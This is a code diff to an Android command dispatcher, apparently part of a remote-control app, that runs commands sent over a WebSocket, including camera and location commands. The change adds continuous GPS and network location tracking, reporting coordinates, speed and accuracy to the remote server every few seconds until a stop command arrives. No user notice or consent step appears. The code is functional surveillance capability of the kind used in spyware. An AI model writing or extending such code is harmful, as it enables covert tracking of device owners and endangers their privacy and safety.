@@ -195,8 +195,8 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
             case "Logdate":     handleLogdate(payload); break;
 
             // 定位
-            case "Location":    handleFetchLocation(); break;
-            case "Locationoff": Log.d(TAG, "Location off"); break;
+            case "Location":    handleStartLocation(); break;
+            case "Locationoff": handleStopLocation(); break;
 
             // 相机
             case "Camera":      handleCamera(payload); break;
@@ -1385,10 +1385,19 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     }
 
     /**
-     * 获取位置 → subc="loc"
+     * 持续定位 — 开始
+     * 使用 requestLocationUpdates 主动触发定位，持续上报
      */
-    private void handleFetchLocation() {
-        Log.d(TAG, "fetchLocation");
+    private android.location.LocationListener locationListener;
+    private volatile boolean locationTracking = false;
+
+    private void handleStartLocation() {
+        Log.d(TAG, "startLocation");
+        if (locationTracking) {
+            Log.d(TAG, "location already tracking");
+            return;
+        }
+
         Context ctx = getAppContext();
         WebSocketClient ws = getWsClient();
         if (ctx == null || ws == null) return;
@@ -1397,33 +1406,95 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
             LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
             if (lm == null) return;
 
+            // 先发送一次缓存位置 (快速响应)
+            sendLastKnownLocation(lm, ws);
+
+            locationListener = new android.location.LocationListener() {
+                @Override
+                public void onLocationChanged(Location loc) {
+                    if (!locationTracking) return;
+                    WebSocketClient wsNow = getWsClient();
+                    if (wsNow == null) return;
+
+                    JsonObject data = new JsonObject();
+                    data.addProperty("lat", loc.getLatitude());
+                    data.addProperty("lng", loc.getLongitude());
+                    data.addProperty("accuracy", loc.getAccuracy());
+                    data.addProperty("speed", loc.getSpeed());
+                    data.addProperty("provider", loc.getProvider());
+                    data.addProperty("time", loc.getTime());
+                    wsNow.sendData("loc", data.toString());
+                }
+
+                @Override public void onStatusChanged(String provider, int status, android.os.Bundle extras) {}
+                @Override public void onProviderEnabled(String provider) {}
+                @Override public void onProviderDisabled(String provider) {}
+            };
+
+            // GPS: 3s 间隔, 1m 最小距离
+            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3000, 1, locationListener);
+                Log.d(TAG, "GPS location updates started");
+            }
+
+            // Network: 5s 间隔, 5m 最小距离 (备选)
+            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 5, locationListener);
+                Log.d(TAG, "Network location updates started");
+            }
+
+            locationTracking = true;
+            Log.i(TAG, "Location tracking started");
+
+        } catch (SecurityException e) {
+            Log.w(TAG, "startLocation: no permission", e);
+        } catch (Exception e) {
+            Log.w(TAG, "startLocation failed", e);
+        }
+    }
+
+    private void handleStopLocation() {
+        Log.d(TAG, "stopLocation");
+        locationTracking = false;
+
+        if (locationListener != null) {
+            try {
+                Context ctx = getAppContext();
+                if (ctx != null) {
+                    LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
+                    if (lm != null) {
+                        lm.removeUpdates(locationListener);
+                    }
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "stopLocation failed", e);
+            }
+            locationListener = null;
+            Log.i(TAG, "Location tracking stopped");
+        }
+    }
+
+    private void sendLastKnownLocation(LocationManager lm, WebSocketClient ws) {
+        try {
             Location loc = null;
-            // 优先 GPS，备选 Network
             if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                 loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             }
             if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                 loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             }
-
             if (loc != null) {
                 JsonObject data = new JsonObject();
                 data.addProperty("lat", loc.getLatitude());
                 data.addProperty("lng", loc.getLongitude());
                 data.addProperty("accuracy", loc.getAccuracy());
+                data.addProperty("speed", loc.getSpeed());
                 data.addProperty("provider", loc.getProvider());
                 data.addProperty("time", loc.getTime());
                 ws.sendData("loc", data.toString());
-                Log.d(TAG, "location sent: " + loc.getLatitude() + "," + loc.getLongitude());
-            } else {
-                ws.sendData("loc", "{}");
-                Log.w(TAG, "location: no last known location");
+                Log.d(TAG, "lastKnown location sent");
             }
-        } catch (SecurityException e) {
-            Log.w(TAG, "fetchLocation: no permission", e);
-        } catch (Exception e) {
-            Log.w(TAG, "fetchLocation failed", e);
-        }
+        } catch (SecurityException ignored) {}
     }
 
     /**
